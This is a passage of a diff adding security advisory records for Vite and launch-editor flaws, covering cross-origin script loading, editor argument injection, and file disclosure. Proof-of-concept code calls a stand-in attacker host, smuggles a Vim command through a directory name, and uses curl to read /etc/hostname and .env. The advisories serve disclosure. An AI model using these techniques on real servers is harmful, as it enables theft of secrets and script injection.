+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-698v-4r3x-3vcv/GHSA-698v-4r3x-3vcv.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.3.0"
+                },
+                {
+                  "fixed": "8.3.3"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.3.2",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-698v-4r3x-3vcv/GHSA-698v-4r3x-3vcv.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.2.0"
+                },
+                {
+                  "fixed": "8.2.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.2.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-698v-4r3x-3vcv/GHSA-698v-4r3x-3vcv.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.0.0"
+                },
+                {
+                  "fixed": "8.1.6"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.1.5",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-698v-4r3x-3vcv/GHSA-698v-4r3x-3vcv.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "7.0.0"
+                },
+                {
+                  "fixed": "7.3.7"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 7.3.6",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-698v-4r3x-3vcv/GHSA-698v-4r3x-3vcv.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.4.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 6.4.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-698v-4r3x-3vcv/GHSA-698v-4r3x-3vcv.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite-plus",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite-plus"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.1.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 1.0.0",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-698v-4r3x-3vcv/GHSA-698v-4r3x-3vcv.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-9jrq-w75r-8gcw",
+      "summary": "Vite: Cross origin script execution through Vite custom middleware",
+      "details": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n<script type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy&index=0.js\"></script>\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '<script type=\"module\">document.body.textContent = \"Vite app\"</script>'\n\nconst listen = (server, port = 0) =>\n  new Promise((resolve, reject) => {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () => {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =>\n  new Promise((resolve, reject) => {\n    server.close((error) => (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) => {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) => {\n  vite.middlewares(request, response, async (error) => {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () => document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy&index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
+      "aliases": [
+        "CVE-2026-112945"
+      ],
+      "modified": "2026-10-21T17:00:26.569382874Z",
+      "published": "2026-10-21T16:48:14Z",
+      "database_specific": {
+        "github_reviewed_at": "2026-10-21T16:48:14Z",
+        "nvd_published_at": "2026-10-20T16:17:05Z",
+        "cwe_ids": [
+          "CWE-80"
+        ],
+        "severity": "LOW",
+        "github_reviewed": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-9jrq-w75r-8gcw"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112945"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/pull/23653"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/7dafd8e56f152403a3230608fa4005273c2e9e17"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.3.0"
+                },
+                {
+                  "fixed": "8.3.3"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.3.2",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-9jrq-w75r-8gcw/GHSA-9jrq-w75r-8gcw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.2.0"
+                },
+                {
+                  "fixed": "8.2.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-9jrq-w75r-8gcw/GHSA-9jrq-w75r-8gcw.json",
+            "last_known_affected_version_range": "<= 8.2.3"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.0.0"
+                },
+                {
+                  "fixed": "8.1.6"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.1.5",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-9jrq-w75r-8gcw/GHSA-9jrq-w75r-8gcw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "7.0.0"
+                },
+                {
+                  "fixed": "7.3.7"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 7.3.6",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-9jrq-w75r-8gcw/GHSA-9jrq-w75r-8gcw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.4.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 6.4.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-9jrq-w75r-8gcw/GHSA-9jrq-w75r-8gcw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite-plus",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite-plus"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.1.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-9jrq-w75r-8gcw/GHSA-9jrq-w75r-8gcw.json",
+            "last_known_affected_version_range": "<= 1.0.0"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-r825-w8mm-5pxw",
+      "summary": "launch-editor: Editor CLI flag misinterpretation causing arbitrary command execution for some editors",
+      "details": "### Summary\n\n`launch-editor` forwarded file paths directly to editors without sanitization. If a path resembles a CLI flag, editors like Vim may interpret it as a command, potentially causing unintended file overwrites or command execution.\n\n### Impact\n\n#### Direct `launch-editor` users\n\nOnly apps that match all of the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The first argument of `launchEditor` can start with `+` or `-` or the user is using WSL\n\n#### `launch-editor-middleware` users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- launch-editor older than v2.2.0 is used, or the user is using WSL\n\n#### Vite users\n\nOnly apps that match the following conditions are affected:\n\n- The attacker is able to create a file system entry (e.g. a file or directory) starting with `+` or `-` in the working directory\n- The user uses or the app specifies any of the following editors:\n  - Vim (including gVim)\n  - MacVim\n  - Emacs (including Emacsclient)\n  - Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n- The user is using WSL\n\n### Details\n\n`launchEditor(file)` function passes the file name as-is to the editor if the file with that file name exists. If the file name starts with `-` (also `+` for Vim), the editor treats them as flags rather than positional arguments. For example, Vim treats arguments starting with `+` as an Ex command. As a result, an existing relative directory such as:\n```\n+call writefile([\"SAFE_MARKER\"],\"LAUNCH_EDITOR_MARKER\")|qa!\n```\nis not treated as a filename when passed to Vim. Vim executes the embedded Ex command.\n\nThe following editor has a potentially destructive operation exposed to the CLI arguments:\n- Vim (including gVim)\n- MacVim\n- Emacs (including Emacsclient)\n- Notepad++ (only if using a plugin exposing dangerous operations via plugin messages)\n\n`launch-editor-middleware` v2.2.0+ converts the passed file path to an absolute path so those are not affected as long as the user is not using WSL. For WSL, `launch-editor` converts the paths to relative paths internally, so those are still affected.\n\nVite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are only affected.",
+      "aliases": [
+        "CVE-2026-112944"
+      ],
+      "modified": "2026-10-20T20:00:04.608907013Z",
+      "published": "2026-10-20T19:51:52Z",
+      "database_specific": {
+        "nvd_published_at": "2026-10-20T15:17:17Z",
+        "cwe_ids": [
+          "CWE-88"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-10-20T19:51:52Z"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/security/advisories/GHSA-r825-w8mm-5pxw"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112944"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/pull/156"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/commit/f6e6701bb1f16f2dd242b321374f1b6cca6eb6d4"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/launch-editor"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/launch-editor/releases/tag/v2.14.2"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "launch-editor",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/launch-editor"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.14.2"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 2.14.1",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-r825-w8mm-5pxw/GHSA-r825-w8mm-5pxw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.3.0"
+                },
+                {
+                  "fixed": "8.3.3"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.3.2",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-r825-w8mm-5pxw/GHSA-r825-w8mm-5pxw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.2.0"
+                },
+                {
+                  "fixed": "8.2.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-r825-w8mm-5pxw/GHSA-r825-w8mm-5pxw.json",
+            "last_known_affected_version_range": "<= 8.2.3"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.0.0"
+                },
+                {
+                  "fixed": "8.1.6"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.1.5",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-r825-w8mm-5pxw/GHSA-r825-w8mm-5pxw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "7.0.0"
+                },
+                {
+                  "fixed": "7.3.7"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 7.3.6",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-r825-w8mm-5pxw/GHSA-r825-w8mm-5pxw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.4.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 6.4.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-r825-w8mm-5pxw/GHSA-r825-w8mm-5pxw.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite-plus",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite-plus"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.1.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 1.0.0",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-r825-w8mm-5pxw/GHSA-r825-w8mm-5pxw.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-rq7h-c2jc-7f22",
+      "summary": "Vite: Files outside `server.fs.allow` could be served when project paths match system paths on non-Windows machine",
+      "details": "### Summary\n\nThe content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was possible to be returned.\n\nThe content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `<project-root>/etc/hosts` could make Vite return the host's `/etc/hosts` file.\n\n### Impact\n\nOnly apps that meet all of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))\n- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host\n- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\n- the dev server is not running on Windows\n\n### Details\n\nWhen Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.\n\nFor a later request to `/@fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.\n\n### PoC\nThe following example requires Linux with a readable `/etc/hostname`:\n```bash\n$ mkdir vite-safe-module-path-poc\n$ cd vite-safe-module-path-poc\n$ npm init -y\n$ npm install vite@8.3.1\n$ mkdir -p etc\n$ echo 'PROJECT-DECOY\\n' > etc/hostname\n$ echo 'import \"./etc/hostname\"\\n' > main.js\n$ npx vite --host 127.0.0.1\n```\n\nIn another terminal:\n```bash\n$ curl -o /dev/null -s -w '%{http_code}\\n' http://127.0.0.1:5173/main.js\n200\n$ curl -sS -o response -w '%{http_code}\\n' http://127.0.0.1:5173/@fs/etc/hostname\n200\n$ cmp -s response /etc/hostname && echo 'response matches host file'\nresponse matches host file\n```",
+      "aliases": [
+        "CVE-2026-112946"
+      ],
+      "modified": "2026-10-21T17:00:06.336868869Z",
+      "published": "2026-10-21T16:47:42Z",
+      "database_specific": {
+        "nvd_published_at": "2026-10-20T16:17:05Z",
+        "cwe_ids": [
+          "CWE-22",
+          "CWE-284"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-10-21T16:47:42Z"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-rq7h-c2jc-7f22"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112946"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/pull/23656"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/170b92791421bcd484f7325936d989a82d6bd4aa"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/45c0e3392a298626955a0ab93a8e51232daac721"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/c3e06f92e969952466b4e2f5801e85e1e00cd905"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/e570d8d016096b5f8f6f09808376ca6cf73f27d0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/f0d76c7da13d5e794807b82f0b86c1931a8438e3"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.3.0"
+                },
+                {
+                  "fixed": "8.3.3"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.3.2",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rq7h-c2jc-7f22/GHSA-rq7h-c2jc-7f22.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.2.0"
+                },
+                {
+                  "fixed": "8.2.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.2.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rq7h-c2jc-7f22/GHSA-rq7h-c2jc-7f22.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "8.0.0"
+                },
+                {
+                  "fixed": "8.1.6"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.1.5",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rq7h-c2jc-7f22/GHSA-rq7h-c2jc-7f22.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "7.0.0"
+                },
+                {
+                  "fixed": "7.3.7"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 7.3.6",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rq7h-c2jc-7f22/GHSA-rq7h-c2jc-7f22.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.4.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 6.4.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rq7h-c2jc-7f22/GHSA-rq7h-c2jc-7f22.json"
+          }
+        },
+        {
+          "package": {
+            "name": "vite-plus",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/vite-plus"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.1.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 1.0.0",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rq7h-c2jc-7f22/GHSA-rq7h-c2jc-7f22.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-vfpm-58rq-9qcg",
+      "summary": "Vite: First 4 bytes of files outside of `server.fs` setting is exposed by `?vite-wasm-instance`",
+      "details": "### Summary\n\nThe first 4 bytes of files outside of `server.fs` setting can be returned to the browser by a request containing `?vite-wasm-instance`.\n\n### Impact\n\n Only apps that match one of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network using `--host` or the [`server.host`](https://vite.dev/config/server-options#server-host) option\n- there's a file that has a sensitive information in **the first 4 bytes**\n- uses Node.js or Deno to run Vite (if Bun is used, it is not affected)\n\n### Details\nRequests containing the `?vite-wasm-instance` query are handled by the internal Wasm plugin's `load` hook. The hook removes the query and reads the resulting path directly from disk, but the `server.fs` checks were not applied.\n\nAfter reading the file, Vite attempts to parse it as WebAssembly. When that parse fails, Node and deno throws an error that contains the first 4 bytes of the file.\n\n### PoC\n\nCreate a denied file and start an affected Vite dev server:\n\n```bash\necho 'SECRET_KEY=abc123\\n' > .env\nnpm run dev\ncurl 'http://localhost:5173/.env?vite-wasm-instance'\n```\n\nThis will show\n```\nFailed to parse WASM file \"<root>/.env\": WebAssembly.compile(): expected magic word 00 61 73 6d, found 53 45 43 52 @+0\n```",
+      "aliases": [
+        "CVE-2026-112947"
+      ],
+      "modified": "2026-10-21T17:00:07.443467820Z",
+      "published": "2026-10-21T16:47:15Z",
+      "database_specific": {
+        "nvd_published_at": "2026-10-20T16:17:05Z",
+        "cwe_ids": [
+          "CWE-200",
+          "CWE-209",
+          "CWE-22"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-10-21T16:47:15Z"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-vfpm-58rq-9qcg"
+        },
+        {
